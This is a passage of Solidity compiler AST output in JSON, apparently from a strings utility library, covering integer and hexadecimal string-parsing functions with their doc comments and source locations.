ring":"uint256"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"id":987,"name":"ABS_MIN_INT256","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":848,"src":"10385:14:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10373:26:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"10343:56:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseBody":{"expression":{"components":[{"hexValue":"66616c7365","id":999,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"10471:5:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"false"},{"hexValue":"30","id":1000,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10478:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"id":1001,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"10470:10:3","typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_rational_0_by_1_$","typeString":"tuple(bool,int_const 0)"}},"functionReturnParameters":898,"id":1002,"nodeType":"Return","src":"10463:17:3"},"id":1003,"nodeType":"IfStatement","src":"10339:141:3","trueBody":{"id":998,"nodeType":"Block","src":"10401:56:3","statements":[{"expression":{"components":[{"hexValue":"74727565","id":990,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"10423:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"true"},{"expression":{"arguments":[{"id":993,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"10434:6:3","typeDescriptions":{"typeIdentifier":"t_type$_t_int256_$","typeString":"type(int256)"},"typeName":{"id":992,"name":"int256","nodeType":"ElementaryTypeName","src":"10434:6:3","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_int256_$","typeString":"type(int256)"}],"id":991,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"10429:4:3","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":994,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10429:12:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_int256","typeString":"type(int256)"}},"id":995,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"10442:3:3","memberName":"min","nodeType":"MemberAccess","src":"10429:16:3","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"id":996,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"10422:24:3","typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_int256_$","typeString":"tuple(bool,int256)"}},"functionReturnParameters":898,"id":997,"nodeType":"Return","src":"10415:31:3"}]}},"id":1004,"nodeType":"IfStatement","src":"10197:283:3","trueBody":{"id":982,"nodeType":"Block","src":"10242:91:3","statements":[{"expression":{"components":[{"hexValue":"74727565","id":968,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"10264:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"true"},{"condition":{"id":969,"name":"negativeSign","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":934,"src":"10270:12:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseExpression":{"arguments":[{"id":977,"name":"absValue","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":954,"src":"10312:8:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":976,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"10305:6:3","typeDescriptions":{"typeIdentifier":"t_type$_t_int256_$","typeString":"type(int256)"},"typeName":{"id":975,"name":"int256","nodeType":"ElementaryTypeName","src":"10305:6:3","typeDescriptions":{}}},"id":978,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10305:16:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"id":979,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"Conditional","src":"10270:51:3","trueExpression":{"id":974,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"-","prefix":true,"src":"10285:17:3","subExpression":{"arguments":[{"id":972,"name":"absValue","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":954,"src":"10293:8:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":971,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"10286:6:3","typeDescriptions":{"typeIdentifier":"t_type$_t_int256_$","typeString":"type(int256)"},"typeName":{"id":970,"name":"int256","nodeType":"ElementaryTypeName","src":"10286:6:3","typeDescriptions":{}}},"id":973,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10286:16:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"id":980,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"10263:59:3","typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_int256_$","typeString":"tuple(bool,int256)"}},"functionReturnParameters":898,"id":981,"nodeType":"Return","src":"10256:66:3"}]}}]},"documentation":{"id":886,"nodeType":"StructuredDocumentation","src":"9281:223:3","text":" @dev Implementation of {tryParseInt-string-uint256-uint256} that does not check bounds. Caller should make sure that\n `begin <= end <= input.length`. Other inputs would result in undefined behavior."},"id":1006,"implemented":true,"kind":"function","modifiers":[],"name":"_tryParseIntUncheckedBounds","nameLocation":"9518:27:3","nodeType":"FunctionDefinition","parameters":{"id":893,"nodeType":"ParameterList","parameters":[{"constant":false,"id":888,"mutability":"mutable","name":"input","nameLocation":"9569:5:3","nodeType":"VariableDeclaration","scope":1006,"src":"9555:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":887,"name":"string","nodeType":"ElementaryTypeName","src":"9555:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"},{"constant":false,"id":890,"mutability":"mutable","name":"begin","nameLocation":"9592:5:3","nodeType":"VariableDeclaration","scope":1006,"src":"9584:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":889,"name":"uint256","nodeType":"ElementaryTypeName","src":"9584:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":892,"mutability":"mutable","name":"end","nameLocation":"9615:3:3","nodeType":"VariableDeclaration","scope":1006,"src":"9607:11:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":891,"name":"uint256","nodeType":"ElementaryTypeName","src":"9607:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"9545:79:3"},"returnParameters":{"id":898,"nodeType":"ParameterList","parameters":[{"constant":false,"id":895,"mutability":"mutable","name":"success","nameLocation":"9652:7:3","nodeType":"VariableDeclaration","scope":1006,"src":"9647:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":894,"name":"bool","nodeType":"ElementaryTypeName","src":"9647:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":897,"mutability":"mutable","name":"value","nameLocation":"9668:5:3","nodeType":"VariableDeclaration","scope":1006,"src":"9661:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":896,"name":"int256","nodeType":"ElementaryTypeName","src":"9661:6:3","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"9646:28:3"},"scope":1631,"src":"9509:978:3","stateMutability":"pure","virtual":false,"visibility":"private"},{"body":{"id":1024,"nodeType":"Block","src":"10832:67:3","statements":[{"expression":{"arguments":[{"id":1015,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1009,"src":"10862:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},{"hexValue":"30","id":1016,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10869:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},{"expression":{"arguments":[{"id":1019,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1009,"src":"10878:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":1018,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"10872:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":1017,"name":"bytes","nodeType":"ElementaryTypeName","src":"10872:5:3","typeDescriptions":{}}},"id":1020,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10872:12:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1021,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"10885:6:3","memberName":"length","nodeType":"MemberAccess","src":"10872:19:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"},{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1014,"name":"parseHexUint","nodeType":"Identifier","overloadedDeclarations":[1025,1056],"referencedDeclaration":1056,"src":"10849:12:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_string_memory_ptr_$_t_uint256_$_t_uint256_$returns$_t_uint256_$","typeString":"function (string memory,uint256,uint256) pure returns (uint256)"}},"id":1022,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10849:43:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":1013,"id":1023,"nodeType":"Return","src":"10842:50:3"}]},"documentation":{"id":1007,"nodeType":"StructuredDocumentation","src":"10493:259:3","text":" @dev Parse a hexadecimal string (with or without \"0x\" prefix), and returns the value as a `uint256`.\n Requirements:\n - The string must be formatted as `(0x)?[0-9a-fA-F]*`\n - The result must fit in an `uint256` type."},"id":1025,"implemented":true,"kind":"function","modifiers":[],"name":"parseHexUint","nameLocation":"10766:12:3","nodeType":"FunctionDefinition","parameters":{"id":1010,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1009,"mutability":"mutable","name":"input","nameLocation":"10793:5:3","nodeType":"VariableDeclaration","scope":1025,"src":"10779:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1008,"name":"string","nodeType":"ElementaryTypeName","src":"10779:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"10778:21:3"},"returnParameters":{"id":1013,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1012,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1025,"src":"10823:7:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1011,"name":"uint256","nodeType":"ElementaryTypeName","src":"10823:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"10822:9:3"},"scope":1631,"src":"10757:142:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1055,"nodeType":"Block","src":"11320:156:3","statements":[{"assignments":[1038,1040],"declarations":[{"constant":false,"id":1038,"mutability":"mutable","name":"success","nameLocation":"11336:7:3","nodeType":"VariableDeclaration","scope":1055,"src":"11331:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1037,"name":"bool","nodeType":"ElementaryTypeName","src":"11331:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":1040,"mutability":"mutable","name":"value","nameLocation":"11353:5:3","nodeType":"VariableDeclaration","scope":1055,"src":"11345:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1039,"name":"uint256","nodeType":"ElementaryTypeName","src":"11345:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":1046,"initialValue":{"arguments":[{"id":1042,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1028,"src":"11378:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},{"id":1043,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1030,"src":"11385:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":1044,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1032,"src":"11392:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1041,"name":"tryParseHexUint","nodeType":"Identifier","overloadedDeclarations":[1077,1114],"referencedDeclaration":1114,"src":"11362:15:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_string_memory_ptr_$_t_uint256_$_t_uint256_$returns$_t_bool_$_t_uint256_$","typeString":"function (string memory,uint256,uint256) pure returns (bool,uint256)"}},"id":1045,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"11362:34:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_uint256_$","typeString":"tuple(bool,uint256)"}},"nodeType":"VariableDeclarationStatement","src":"11330:66:3"},{"condition":{"id":1048,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"!","prefix":true,"src":"11410:8:3","subExpression":{"id":1047,"name":"success","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1038,"src":"11411:7:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1052,"nodeType":"IfStatement","src":"11406:41:3","trueBody":{"errorCall":{"arguments":[],"expression":{"argumentTypes":[],"id":1049,"name":"StringsInvalidChar","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":292,"src":"11427:18:3","typeDescriptions":{"typeIdentifier":"t_function_error_pure$__$returns$_t_error_$","typeString":"function () pure returns (error)"}},"id":1050,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"11427:20:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":1051,"nodeType":"RevertStatement","src":"11420:27:3"}},{"expression":{"id":1053,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1040,"src":"11464:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":1036,"id":1054,"nodeType":"Return","src":"11457:12:3"}]},"documentation":{"id":1026,"nodeType":"StructuredDocumentation","src":"10905:307:3","text":" @dev Variant of {parseHexUint-string} that parses a substring of `input` located between position `begin` (included) and\n `end` (excluded).\n Requirements:\n - The substring must be formatted as `(0x)?[0-9a-fA-F]*`\n - The result must fit in an `uint256` type."},"id":1056,"implemented":true,"kind":"function","modifiers":[],"name":"parseHexUint","nameLocation":"11226:12:3","nodeType":"FunctionDefinition","parameters":{"id":1033,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1028,"mutability":"mutable","name":"input","nameLocation":"11253:5:3","nodeType":"VariableDeclaration","scope":1056,"src":"11239:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1027,"name":"string","nodeType":"ElementaryTypeName","src":"11239:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"},{"constant":false,"id":1030,"mutability":"mutable","name":"begin","nameLocation":"11268:5:3","nodeType":"VariableDeclaration","scope":1056,"src":"11260:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1029,"name":"uint256","nodeType":"ElementaryTypeName","src":"11260:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":1032,"mutability":"mutable","name":"end","nameLocation":"11283:3:3","nodeType":"VariableDeclaration","scope":1056,"src":"11275:11:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1031,"name":"uint256","nodeType":"ElementaryTypeName","src":"11275:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"11238:49:3"},"returnParameters":{"id":1036,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1035,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":1056,"src":"11311:7:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1034,"name":"uint256","nodeType":"ElementaryTypeName","src":"11311:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"11310:9:3"},"scope":1631,"src":"11217:259:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1076,"nodeType":"Block","src":"11803:86:3","statements":[{"expression":{"arguments":[{"id":1067,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1059,"src":"11852:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},{"hexValue":"30","id":1068,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"11859:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},{"expression":{"arguments":[{"id":1071,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1059,"src":"11868:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":1070,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"11862:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":1069,"name":"bytes","nodeType":"ElementaryTypeName","src":"11862:5:3","typeDescriptions":{}}},"id":1072,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"11862:12:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1073,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"11875:6:3","memberName":"length","nodeType":"MemberAccess","src":"11862:19:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"},{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1066,"name":"_tryParseHexUintUncheckedBounds","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1217,"src":"11820:31:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_string_memory_ptr_$_t_uint256_$_t_uint256_$returns$_t_bool_$_t_uint256_$","typeString":"function (string memory,uint256,uint256) pure returns (bool,uint256)"}},"id":1074,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"11820:62:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_uint256_$","typeString":"tuple(bool,uint256)"}},"functionReturnParameters":1065,"id":1075,"nodeType":"Return","src":"11813:69:3"}]},"documentation":{"id":1057,"nodeType":"StructuredDocumentation","src":"11482:218:3","text":" @dev Variant of {parseHexUint-string} that returns false if the parsing fails because of an invalid character.\n NOTE: This function will revert if the result does not fit in a `uint256`."},"id":1077,"implemented":true,"kind":"function","modifiers":[],"name":"tryParseHexUint","nameLocation":"11714:15:3","nodeType":"FunctionDefinition","parameters":{"id":1060,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1059,"mutability":"mutable","name":"input","nameLocation":"11744:5:3","nodeType":"VariableDeclaration","scope":1077,"src":"11730:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":1058,"name":"string","nodeType":"ElementaryTypeName","src":"11730:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"11729:21:3"},"returnParameters":{"id":1065,"nodeType":"ParameterList","parameters":[{"constant":false,"id":1062,"mutability":"mutable","name":"success","nameLocation":"11779:7:3","nodeType":"VariableDeclaration","scope":1077,"src":"11774:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":1061,"name":"bool","nodeType":"ElementaryTypeName","src":"11774:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":1064,"mutability":"mutable","name":"value","nameLocation":"11796:5:3","nodeType":"VariableDeclaration","scope":1077,"src":"11788:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":1063,"name":"uint256","nodeType":"ElementaryTypeName","src":"11788:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"11773:29:3"},"scope":1631,"src":"11705:184:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":1113,"nodeType":"Block","src":"12297:147:3","statements":[{"condition":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":1101,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1097,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1091,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1084,"src":"12311:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":1094,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1080,"src":"12323:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":1093,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"12317:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":1092,"name":"bytes","nodeType":"ElementaryTypeName","src":"12317:5:3","typeDescriptions":{}}},"id":1095,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"12317:12:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":1096,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"12330:6:3","memberName":"length","nodeType":"MemberAccess","src":"12317:19:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"12311:25:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"||","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":1100,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":1098,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1082,"src":"12340:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"id":1099,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1084,"src":"12348:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"12340:11:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"12311:40:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":1106,"nodeType":"IfStatement","src":"12307:63:3","trueBody":{"expression":{"components":[{"hexValue":"66616c7365","id":1102,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"12361:5:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"false"},{"hexValue":"30","id":1103,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"12368:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"id":1104,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"12360:10:3","typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_rational_0_by_1_$","typeString":"tuple(bool,int_const 0)"}},"functionReturnParameters":1090,"id":1105,"nodeType":"Return","src":"12353:17:3"}},{"expression":{"arguments":[{"id":1108,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1080,"src":"12419:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},{"id":1109,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1082,"src":"12426:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":1110,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1084,"src":"12433:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":1107,"name":"_tryParseHexUintUncheckedBounds","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":1217,"src":"12387:31:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_string_memory_ptr_$_t_uint256_$_t_uint256_$returns$_t_bool_$_t_uint256_$","typeString":"function (string memory,uint256,uint256) pure returns (bool,uint256)"}},"id":1111,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"12387:50:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_uint256_$","typeString":"tuple(bool,uint256)"}},"functionReturnParameters":1090,"id":1112,"nodeType":"Return","src":"12380:57:3"}]},"documentation":{"id":1078,"nodeType":"StructuredDocumentation","src":"11895:241:3","text":" @dev Variant of {parseHexUint-string-uint256-uint256} that returns false if the parsing fails because of an\n invalid character.\n NOTE: This function will revert if the result does not fit in a 